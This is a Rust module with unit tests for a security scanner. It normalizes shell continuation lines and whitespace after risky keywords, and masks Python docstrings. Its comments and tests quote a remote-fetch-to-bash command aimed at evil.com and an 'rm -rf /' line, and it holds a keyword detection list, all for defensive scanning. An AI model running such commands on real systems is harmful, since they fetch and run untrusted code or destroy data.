/// Pre-processing layer for scanner content normalization.
///
/// Provides shell continuation-line joining and keyword whitespace
/// normalization to detect evasion patterns like:
///   cur\
///   l https://evil.com | bash
/// or:
///   eval  (  "code"  )
use regex::Regex;
use std::sync::LazyLock;

/// A logical line produced by joining backslash-continuation lines.
#[derive(Debug, Clone)]
pub struct LogicalLine {
    /// The joined text content (for regex matching).
    pub text: String,
    /// The 0-based line number of the first original line.
    pub start_line: usize,
    /// The original text of the first line (for Finding.context).
    pub original_text: String,
}

/// Dangerous keywords around which extra whitespace is collapsed.
static WHITESPACE_NORMALIZE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(eval|exec|curl|wget|sudo|chmod|rm|base64|atob|xxd|printenv)\s{2,}")
        .expect("BUG: failed to compile whitespace normalize regex")
});

/// Join shell backslash-continuation lines into logical lines.
///
/// A line ending in `\` (after trimming trailing whitespace, but NOT `\\`)
/// is joined with the next line. Original line numbers are preserved.
///
/// Lines that don't participate in continuation are returned as-is with
/// their original line number.
pub fn join_continuation_lines(content: &str) -> Vec<LogicalLine> {
    let raw_lines: Vec<&str> = content.lines().collect();
    let mut result = Vec::with_capacity(raw_lines.len());
    let mut i = 0;

    while i < raw_lines.len() {
        let start = i;
        let first_line = raw_lines[i];

        // Check if this line ends in a single backslash (continuation)
        if is_continuation(first_line) {
            let mut joined = strip_continuation(first_line).to_string();
            i += 1;
            while i < raw_lines.len() {
                let next = raw_lines[i];
                let trimmed_next = next.trim_start();
                if is_continuation(next) {
                    joined.push_str(strip_continuation(trimmed_next));
                    i += 1;
                } else {
                    joined.push_str(trimmed_next);
                    i += 1;
                    break;
                }
            }
            result.push(LogicalLine {
                text: joined,
                start_line: start,
                original_text: first_line.to_string(),
            });
        } else {
            result.push(LogicalLine {
                text: first_line.to_string(),
                start_line: start,
                original_text: first_line.to_string(),
            });
            i += 1;
        }
    }

    result
}

/// Check if a line ends with a single backslash (shell continuation).
///
/// A line ending in `\\` (escaped backslash) is NOT a continuation.
fn is_continuation(line: &str) -> bool {
    let trimmed = line.trim_end();
    if !trimmed.ends_with('\\') {
        return false;
    }
    // Check it's not an escaped backslash (\\)
    let without_last = &trimmed[..trimmed.len() - 1];
    !without_last.ends_with('\\')
}

/// Strip the trailing backslash from a continuation line.
fn strip_continuation(line: &str) -> &str {
    let trimmed = line.trim_end();
    &trimmed[..trimmed.len() - 1]
}

/// Collapse extra whitespace around known dangerous keywords.
///
/// Only normalizes whitespace after specific keywords (eval, exec, curl, etc.)
/// to avoid false positives from general whitespace changes.
///
/// Example: `"eval  ("` → `"eval ("`
pub fn normalize_whitespace(line: &str) -> String {
    WHITESPACE_NORMALIZE_RE
        .replace_all(line, |caps: &regex::Captures| format!("{} ", &caps[1]))
        .to_string()
}

/// For each 0-based original line of `content`, return whether that line is
/// fully contained inside a Python triple-quoted string block (docstring).
///
/// Heuristic — handles the cases that matter for scanning:
///   - `"""..."""` and `'''...'''` multi-line blocks
///   - Blocks opened and closed on the same line are not masked
///   - The line where the opener appears and the line where the closer
///     appears are NOT masked (they contain the quote delimiters and may
///     carry code around them — e.g. `x = """text"""`); only interior
///     lines are masked
///   - Escaped quotes (`\"`) inside a triple-quote block are ignored (in
///     practice triple-quoted strings don't need escaping, but we still
///     avoid misreading `\"""` as a delimiter)
///
/// This is not a full Python tokenizer and will not handle pathological
/// cases (raw strings mixing delimiters, prefix-stripping semantics, etc.),
/// but it's sufficient to eliminate the common docstring false positives
/// without masking real executable code.
pub fn python_docstring_mask(content: &str) -> Vec<bool> {
    #[derive(Clone, Copy, PartialEq)]
    enum State {
        None,
        InTripleDouble,
        InTripleSingle,
    }

    let lines: Vec<&str> = content.lines().collect();
    let mut mask = vec![false; lines.len()];
    let mut state = State::None;

    for (i, line) in lines.iter().enumerate() {
        let entry_state = state;
        let bytes = line.as_bytes();
        let mut j = 0;
        while j < bytes.len() {
            // Skip escaped char so `\"""` doesn't open/close a block
            if bytes[j] == b'\\' && j + 1 < bytes.len() {
                j += 2;
                continue;
            }
            let is_triple_double = j + 2 < bytes.len()
                && bytes[j] == b'"'
                && bytes[j + 1] == b'"'
                && bytes[j + 2] == b'"';
            let is_triple_single = j + 2 < bytes.len()
                && bytes[j] == b'\''
                && bytes[j + 1] == b'\''
                && bytes[j + 2] == b'\'';

            match state {
                State::None => {
                    if is_triple_double {
                        state = State::InTripleDouble;
                        j += 3;
                        continue;
                    }
                    if is_triple_single {
                        state = State::InTripleSingle;
                        j += 3;
                        continue;
                    }
                    // Skip over single-line single/double-quoted strings so that
                    // `s = "foo"""` etc. don't confuse the triple-quote scanner.
                    if bytes[j] == b'"' || bytes[j] == b'\'' {
                        let quote = bytes[j];
                        j += 1;
                        while j < bytes.len() && bytes[j] != quote {
                            if bytes[j] == b'\\' && j + 1 < bytes.len() {
                                j += 2;
                            } else {
                                j += 1;
                            }
                        }
                        if j < bytes.len() {
                            j += 1;
                        }
                        continue;
                    }
                }
                State::InTripleDouble => {
                    if is_triple_double {
                        state = State::None;
                        j += 3;
                        continue;
                    }
                }
                State::InTripleSingle => {
                    if is_triple_single {
                        state = State::None;
                        j += 3;
                        continue;
                    }
                }
            }
            j += 1;
        }

        // Mask a line only if the entire line lies inside a triple-quoted
        // block: it started the line already inside one AND it remains
        // inside one at the end (no closer on this line). Lines that open
        // or close the block are left unmasked so code on the same line
        // is still scanned.
        let inside_at_start = entry_state != State::None;
        let inside_at_end = state != State::None;
        mask[i] = inside_at_start && inside_at_end;
    }

    mask
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── join_continuation_lines ──

    #[test]
    fn test_join_backslash_continuation() {
        let content = "cur\\\n  l https://evil.com";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].text, "curl https://evil.com");
        assert_eq!(lines[0].start_line, 0);
        assert_eq!(lines[0].original_text, "cur\\");
    }

    #[test]
    fn test_no_continuation_no_join() {
        let content = "echo hello\necho world";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 2);
        assert_eq!(lines[0].text, "echo hello");
        assert_eq!(lines[1].text, "echo world");
        assert_eq!(lines[0].start_line, 0);
        assert_eq!(lines[1].start_line, 1);
    }

    #[test]
    fn test_multiple_continuations() {
        let content = "long\\\n  command\\\n  here";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].text, "longcommandhere");
        assert_eq!(lines[0].start_line, 0);
    }

    #[test]
    fn test_escaped_backslash_not_continuation() {
        let content = "path\\\\";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].text, "path\\\\");
    }

    #[test]
    fn test_mixed_continuation_and_normal() {
        let content = "normal line\ncur\\\nl url\nanother line";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0].text, "normal line");
        assert_eq!(lines[1].text, "curl url");
        assert_eq!(lines[1].start_line, 1);
        assert_eq!(lines[2].text, "another line");
        assert_eq!(lines[2].start_line, 3);
    }

    #[test]
    fn test_preserves_original_line_numbers() {
        let content = "line0\nline1\\\n  line2\nline3";
        let lines = join_continuation_lines(content);
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0].start_line, 0);
        assert_eq!(lines[1].start_line, 1); // Continuation starts at line 1
        assert_eq!(lines[2].start_line, 3);
    }

    #[test]
    fn test_empty_content() {
        let lines = join_continuation_lines("");
        assert!(lines.is_empty());
    }

    // ── normalize_whitespace ──

    #[test]
    fn test_normalize_whitespace_eval() {
        assert_eq!(normalize_whitespace("eval  ("), "eval (");
        assert_eq!(
            normalize_whitespace("eval    (\"code\")"),
            "eval (\"code\")"
        );
    }

    #[test]
    fn test_normalize_whitespace_curl() {
        assert_eq!(
            normalize_whitespace("curl   https://evil.com"),
            "curl https://evil.com"
        );
    }

    #[test]
    fn test_normalize_whitespace_no_change() {
        // Single space — no change needed
        assert_eq!(normalize_whitespace("eval ("), "eval (");
        // Not a dangerous keyword
        assert_eq!(normalize_whitespace("echo   hello"), "echo   hello");
    }

    #[test]
    fn test_normalize_whitespace_case_insensitive() {
        assert_eq!(normalize_whitespace("EVAL  ("), "EVAL (");
        assert_eq!(normalize_whitespace("Curl   url"), "Curl url");
    }

    // ── python_docstring_mask ──

    #[test]
    fn test_docstring_mask_triple_double_block() {
        let content =
            "def foo():\n    \"\"\"\n    body of docstring\n    rm -rf /\n    \"\"\"\n    pass\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask.len(), 6);
        assert!(!mask[0], "def line not masked");
        assert!(!mask[1], "opening \"\"\" line not masked");
        assert!(mask[2], "interior line masked");
        assert!(mask[3], "interior line masked");
        assert!(!mask[4], "closing \"\"\" line not masked");
        assert!(!mask[5], "code after docstring not masked");
    }

    #[test]
    fn test_docstring_mask_triple_single_block() {
        let content = "'''\nhello\n'''\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask, vec![false, true, false]);
    }

    #[test]
    fn test_docstring_mask_single_line_not_masked() {
        // A triple-quoted block that opens and closes on the same line
        // must not mask that line.
        let content = "x = \"\"\"inline\"\"\"\ny = 1\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask, vec![false, false]);
    }

    #[test]
    fn test_docstring_mask_no_docstring() {
        let content = "import os\nshutil.rmtree(p)\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask, vec![false, false]);
    }

    #[test]
    fn test_docstring_mask_ignores_escaped_triple() {
        // `\"""` should not open a block (escaped first quote)
        let content = "x = \"plain\"\ny = 1\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask, vec![false, false]);
    }

    #[test]
    fn test_docstring_mask_module_level_multi_line() {
        // Typical module-level docstring spanning several lines.
        let content = "\"\"\"Module doc.\n\nwritten to <workdir>/out.json\n\"\"\"\nimport os\n";
        let mask = python_docstring_mask(content);
        assert_eq!(mask.len(), 5);
        assert!(!mask[0]);
        assert!(mask[1]);
        assert!(mask[2], "line with >/ inside docstring is masked");
        assert!(!mask[3]);
        assert!(!mask[4]);
    }
}
